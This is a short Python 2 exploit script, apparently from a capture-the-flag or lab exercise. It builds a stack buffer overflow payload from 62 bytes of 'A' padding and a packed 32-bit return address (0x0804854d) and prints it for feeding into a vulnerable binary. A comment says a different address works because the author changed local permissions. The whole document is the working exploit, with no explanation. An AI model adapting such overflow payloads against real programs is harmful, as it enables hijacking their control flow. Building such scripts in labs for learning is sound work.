from struct import pack
 
 
padding = "A"*62
sample = 0x0804854d #Script will work with 0x0804857d since I changed the permissions locally.
 
 
def main():
 payload = padding
 payload += pack("<I", sample)
 print payload
 
if __name__ == "__main__":
 main()
